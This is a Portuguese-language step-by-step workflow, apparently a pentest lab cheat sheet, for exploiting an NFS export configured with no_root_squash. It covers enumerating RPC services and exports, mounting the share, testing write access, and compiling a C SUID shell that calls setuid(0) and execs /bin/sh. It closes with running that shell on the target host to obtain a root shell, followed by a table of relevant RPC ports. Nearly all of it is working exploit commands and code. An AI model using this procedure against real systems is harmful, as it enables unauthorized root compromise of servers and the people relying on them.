# üõ†Ô∏è Workflow Explora√ß√£o NFS Vulner√°vel (`no_root_squash`)

## 1. Enumera√ß√£o Inicial
Verificar quais servi√ßos RPC est√£o ativos:

```bash
rpcinfo -p <IP-alvo>
```

- Confirme se existe:
  - **111/tcp** (portmapper)
  - **2049/tcp** (NFS)
  - **mountd** (porta din√¢mica, ex: 53528)

Listar exports dispon√≠veis:

```bash
showmount -e <IP-alvo>
```

> üí° Se n√£o responder, use:
```bash
nmap --script nfs-showmount -p 2049 <IP-alvo>
```

---

## 2. Montar Export
Crie um diret√≥rio local e monte o export:

```bash
sudo mkdir -p /mnt/teste
sudo mount -t nfs <IP-alvo>:/ /mnt/teste
```

Verifique se montou corretamente:

```bash
mount | grep nfs
```

---

## 3. Testar Escrita
Testar se √© poss√≠vel escrever no export:

```bash
sudo bash -c 'echo "teste root" > /mnt/teste/rootcheck.txt'
ls -l /mnt/teste/rootcheck.txt
```

- Se o arquivo for criado ‚Üí o export √© **RW**.

---

## 4. Criar Bin√°rio SUID
No diret√≥rio montado, crie um shell SUID:

```bash
cat <<'EOF' > /mnt/teste/suid_shell.c
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/sh","sh",NULL); }
EOF

gcc /mnt/teste/suid_shell.c -o /mnt/teste/suid_shell
chmod +s /mnt/teste/suid_shell
```

Verifique as permiss√µes:

```bash
ls -l /mnt/teste/suid_shell
# deve mostrar: -rwsr-xr-x
```

---

## 5. Execu√ß√£o no Servidor
No **servidor alvo (192.168.56.113)**, v√° at√© o export e execute:

```bash
./suid_shell
```

Se o exploit funcionar, voc√™ ter√°:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

‚û°Ô∏è **Shell root na m√°quina alvo.**

---

## üîπ Resumo de Portas Importantes

| Programa RPC     | Porta   | Protocolo | Fun√ß√£o                                |
|------------------|---------|-----------|---------------------------------------|
| portmapper       | 111     | TCP/UDP   | Descobre quais portas servi√ßos RPC usam|
| mountd           | Din√¢mico| TCP/UDP   | Lista exports e fornece handle inicial |
| nfs daemon       | 2049    | TCP/UDP   | Leitura/escrita de arquivos exportados |
| nlockmgr         | Din√¢mico| TCP/UDP   | Gerencia locks de arquivos             |
| status (statd)   | Din√¢mico| TCP/UDP   | Mant√©m info de clientes/locks          |

